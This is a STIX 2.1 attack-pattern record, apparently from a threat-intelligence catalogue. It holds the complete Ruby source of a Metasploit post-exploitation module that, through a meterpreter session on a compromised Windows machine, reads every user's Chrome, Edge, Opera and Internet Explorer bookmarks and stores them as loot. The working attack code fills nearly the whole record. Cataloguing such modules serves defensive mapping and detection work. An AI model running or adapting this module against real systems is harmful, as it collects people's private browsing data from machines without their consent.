{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--134e93ea-ca4b-4c5d-8471-7c4fdc4e919f",
    "created": "2024-08-14T16:33:05.040424Z",
    "modified": "2024-08-14T16:33:05.040428Z",
    "name": "Bookmarked Sites Retriever",
    "description": " This module discovers information about a target by retrieving their bookmarked websites on Google Chrome, Opera and Microsoft Edge.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/get_bookmarks.rb",
            "external_id": "get_bookmarks.rb"
        }
    ],
    "x_code_snippet": "class MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Bookmarked Sites Retriever',\n        'Description' => %q{\n          This module discovers information about a target by retrieving their bookmarked websites on Google Chrome, Opera and Microsoft Edge.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'jerrelgordon'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => ['meterpreter'],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [ ],\n          'SideEffects' => []\n        }\n      )\n )\n  end\n\n  def run\n    get_bookmarks('GoogleChrome') # gets bookmarks for google chrome\n    get_bookmarks('Opera') # gets bookmarks for opera\n    get_bookmarks('Edge') # gets bookmarks for edge\n    get_bookmarks('IE') # gets bookmarks for internet explorer\n  end\n\n  def get_bookmarks(browser)\n    file_exists = false # initializes file as not found\n    grab_user_profiles.each do |user| # parses information for all users on target machine into a list.\n      # If the browser is Google Chrome or Edge is searches the \"AppData\\Local directory, if it is Opera, it searches the AppData\\Roaming directory\"\n      if (browser == 'GoogleChrome')\n        next unless user['LocalAppData']\n\n        bookmark_path = \"#{user['LocalAppData']}\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Bookmarks\" # sets path for Google Chrome Bookmarks\n      elsif (browser == 'Edge')\n        next unless user['LocalAppData']\n\n        bookmark_path = \"#{user['LocalAppData']}\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Bookmarks\" # sets path for Microsoft Edge Bookmarks\n      elsif (browser == 'Opera')\n        next unless user['AppData']\n\n        bookmark_path = \"#{user['AppData']}\\\\Opera Software\\\\Opera Stable\\\\Bookmarks\" # sets path for Opera Bookmarks\n      elsif (browser == 'IE')\n        next unless user['Favorites']\n\n        bookmark_path = (user['Favorites']).to_s # sets path for IE Bookmarks Folder\n        count = 1\n        dir(bookmark_path).each do |file| # IE bookmarks stored individually as files so loots each one\n          next if ['.', '..'].include?(file)\n\n          file_exists = true\n          print_status(\"BOOKMARKS FOR #{user['ProfileDir']}\")\n          path2 = \"#{bookmark_path}\\\\#{file}\"\n          file_contents = read_file(path2)\n          stored_bookmarks = store_loot(\n            \"#{browser}.bookmarks\",\n            'text/plain',\n            session,\n            file_contents,\n            \"#{session}_#{count}_#{browser}_bookmarks.txt\",\n            \"Bookmarks for #{browser}\"\n          )\n          print_status(\"Bookmarks stored: #{stored_bookmarks}\")\n          count += 1\n        end\n      end\n\n      next unless file?(bookmark_path) # if file exists it is set to found, then all the bookmarks are outputted to standard output (the shell)\n\n      file_exists = true\n      print_status(\"BOOKMARKS FOR #{user['ProfileDir']}\")\n      file = read_file(bookmark_path)\n      stored_bookmarks = store_loot(\n        \"#{browser}.bookmarks\",\n        'text/plain',\n        session,\n        file,\n        \"#{session}_#{browser}_bookmarks.txt\",\n        \"Bookmarks for #{browser}\"\n      )\n      print_status(\"Bookmarks stored: #{stored_bookmarks}\")\n    end\n    if (file_exists == false) # if file was not found, prints no file found.\n      print_status(\"No Bookmarks found for #{browser}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}